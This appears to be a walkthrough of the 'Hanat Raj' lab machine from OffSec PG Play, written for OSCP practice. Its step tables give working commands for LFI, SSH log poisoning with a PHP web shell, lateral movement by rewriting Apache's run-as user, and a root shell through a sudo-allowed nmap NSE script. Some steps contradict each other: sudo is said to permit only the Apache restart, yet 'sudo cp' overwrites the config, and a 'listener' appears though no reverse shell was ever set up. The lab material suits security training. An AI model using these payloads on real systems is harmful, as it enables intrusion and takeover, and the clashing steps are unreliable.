This walkthrough for the Hanat Raj machine from OffSec's PG Play environment demonstrates key concepts for the OSCP exam, including **Local File Inclusion (LFI) via Log Poisoning**, **Lateral Movement** through a service misconfiguration, and **Privilege Escalation** using a `sudo` vulnerability.

***

## 1. Initial Access & LFI Exploitation

The path to initial access involved discovering an LFI vulnerability and exploiting it by poisoning the SSH authentication log file.

### Commands & Findings

| Step | Command/Action | Finding/Concept | Timestamp |
| :--- | :--- | :--- | :--- |
| **Initial Scan** | `nmap -p- -sV -A <IP> -T4 --open` | **Open Ports:** **22 (SSH)** and **80 (HTTP)**. Running **Ubuntu/Apache**. | [[30:36](http://www.youtube.com/watch?v=dmGyq2Ny3ow&t=1836)] |
| **Directory Fuzzing** | `wfuzz -w /usr/share/wordlists/dirb/common.txt -H "Host: <IP>" -u http://<IP>/FUZZ -Hh 0` | Discovered the **`/console`** directory. | [[39:06](http://www.youtube.com/watch?v=dmGyq2Ny3ow&t=2346)] |
| **Parameter Fuzzing**| `wfuzz -w /path/to/wordlist -u http://<IP>/console/file.php?FUZZ=test -Hh 0` | Discovered the LFI parameter: **`file.php?file=...`** | [[43:46](http://www.youtube.com/watch?v=dmGyq2Ny3ow&t=2626)] |
| **LFI Verification**| Access **`http://<IP>/console/file.php?file=/etc/passwd`** | Verified **Local File Inclusion (LFI)** and found two system users: **`notraj`** and **`mahakal`**. | [[45:08](http://www.youtube.com/watch?v=dmGyq2Ny3ow&t=2708)] |
| **Log Poisoning**| `nc -nv <IP> 22` | Send the PHP payload as the username to poison the SSH authentication log (`/var/log/auth.log`). | [[51:40](http://www.youtube.com/watch?v=dmGyq2Ny3ow&t=3100)] |
| **PHP Payload** | `<?php system($_GET['cmd']); ?>` | This payload is written to the log and executes commands via the `cmd` GET parameter. | N/A |
| **RCE (Initial Shell)** | Access **`http://<IP>/console/file.php?file=/var/log/auth.log&cmd=id`** | Confirmed **Remote Code Execution (RCE)**. User: **`www-data`**. | [[53:22](http://www.youtube.com/watch?v=dmGyq2Ny3ow&t=3202)] |

***

## 2. Lateral Movement (www-data to mahakal)

The user `www-data` had a severe misconfiguration allowing it to restart the Apache service via `sudo`, which was abused to gain access as the higher-privileged user `mahakal`.

### Commands & Key Concepts

| Step | Command/Action | Concept | Timestamp |
| :--- | :--- | :--- | :--- |
| **Check Sudo** | `sudo -l` | Found that `www-data` can execute `/bin/systemctl restart apache2` as `sudo`. | [[01:10:02](http://www.youtube.com/watch?v=dmGyq2Ny3ow&t=4202)] |
| **Copy Config** | `cp /etc/apache2/apache2.conf .` | Make a local copy of the Apache configuration file. | [[01:12:34](http://www.youtube.com/watch?v=dmGyq2Ny3ow&t=4354)] |
| **Modify Config** | `sed -i 's/${APACHE_RUN_USER}/mahakal/g' apache2.conf` and modify `APACHE_RUN_GROUP`. | Changed the user that the Apache service runs as from `www-data` to **`mahakal`**. | [[01:13:01](http://www.youtube.com/watch?v=dmGyq2Ny3ow&t=4381)] |
| **Overwrite Config** | `sudo cp apache2.conf /etc/apache2/apache2.conf` | Overwrite the original configuration file using the `www-data`'s permissions. | [[01:14:32](http://www.youtube.com/watch?v=dmGyq2Ny3ow&t=4472)] |
| **Restart Service** | `sudo /bin/systemctl restart apache2` | Restarts the Apache service, which immediately drops the `www-data` shell. | [[01:16:38](http://www.youtube.com/watch?v=dmGyq2Ny3ow&t=4598)] |
| **Regain Shell** | Repeat LFI log poisoning with a new listener. | The new shell is received, but this time running as user **`mahakal`**. | [[01:18:07](http://www.youtube.com/watch?v=dmGyq2Ny3ow&t=4687)] |

***

## 3. Privilege Escalation (mahakal to root)

As `mahakal`, a final `sudo` check revealed another critical misconfiguration, allowing the user to execute `nmap` with custom scripts as `root`.

### Commands & Key Concepts

| Step | Command/Action | Concept | Timestamp |
| :--- | :--- | :--- | :--- |
| **Check Sudo** | `sudo -l` | Found that `mahakal` can execute **`/usr/bin/nmap`** with any script (`--script *`) as **`root`** without a password. | [[01:19:15](http://www.youtube.com/watch?v=dmGyq2Ny3ow&t=4755)] |
| **Create Payload** | `echo 'os.execute("/bin/bash")' > /dev/shm/offsec.nse` | Created a custom Nmap Lua script (`.nse` extension) in a world-writable directory (`/dev/shm`) to execute a `/bin/bash` shell. | [[01:19:30](http://www.youtube.com/watch?v=dmGyq2Ny3ow&t=4770)] |
| **Execute Payload** | `sudo /usr/bin/nmap --script=/dev/shm/offsec.nse` | Executed the Nmap script as `root`. | [[01:20:25](http://www.youtube.com/watch?v=dmGyq2Ny3ow&t=4825)] |
| **Final Result** | `whoami` and `id` | Confirmed **root** access and **total compromise** of the machine. | [[01:21:04](http://www.youtube.com/watch?v=dmGyq2Ny3ow&t=4864)] |

***

### Takeaways for OSCP

* **Enumeration is Key:** Don't stop at open ports. Fuzzing for directories and parameters on web servers (Wfuzz/Dirbuster) is essential.
* **LFI is Dangerous:** When LFI is confirmed, immediately test for Log Poisoning vectors using common logs:
    * `/var/log/auth.log` (via failed SSH login)
    * `/var/log/apache2/access.log` (via injecting into the User-Agent field)
* **`sudo -l` is Gold:** Always check `sudo -l` for *every* user, including low-privilege users like `www-data` and newly compromised system users.
    * A service restart permission in `sudo` can be a path to lateral movement by modifying service configuration files (e.g., Apache, Nginx, MySQL).
    * Binaries allowed to run with `sudo` (like `nmap`, `find`, `vim`) can often be abused for full root access (check [GTFOBins](https://gtfobins.github.io/)).

The content of this walkthrough can be found here: [http://www.youtube.com/watch?v=dmGyq2Ny3ow](http://www.youtube.com/watch?v=dmGyq2Ny3ow)
http://googleusercontent.com/youtube_content/0